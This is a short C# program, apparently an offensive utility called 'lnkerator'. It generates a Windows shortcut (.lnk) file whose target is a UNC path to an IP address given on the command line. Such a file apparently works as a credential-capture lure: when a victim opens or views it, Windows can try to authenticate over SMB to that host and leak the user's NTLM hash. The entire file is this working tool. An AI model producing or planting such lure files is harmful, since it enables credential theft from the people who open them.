using IWshRuntimeLibrary;
using System.Net;
using System.Runtime.CompilerServices;

namespace lnkerator
{
    internal class Program
    {
        private IPAddress ipAddress;
        private string shortcutName;

        private Program(IPAddress ipAddress, string shortcutName)
        {
            this.ipAddress = ipAddress;
            this.shortcutName = shortcutName;
        }

        static void Main(string[] args)
        {
            IPAddress ipAddress = IPAddress.Parse(args[0]);
            string shortcutName = args[1];

            Program program = new Program(ipAddress, shortcutName);
            program.GenerateLnk();

            Console.WriteLine("[+] Complete");
            Console.ReadKey();
        }

        private void GenerateLnk()
        {
            WshShell wshShell = new WshShell();
            IWshRuntimeLibrary.IWshShortcut? shortcut = wshShell.CreateShortcut(this.shortcutName + ".lnk") as
                IWshRuntimeLibrary.IWshShortcut;

            if (shortcut != null)
            {
                shortcut.TargetPath = "\\\\" + this.ipAddress.ToString();
                shortcut.Save();
            }
        }
    }
}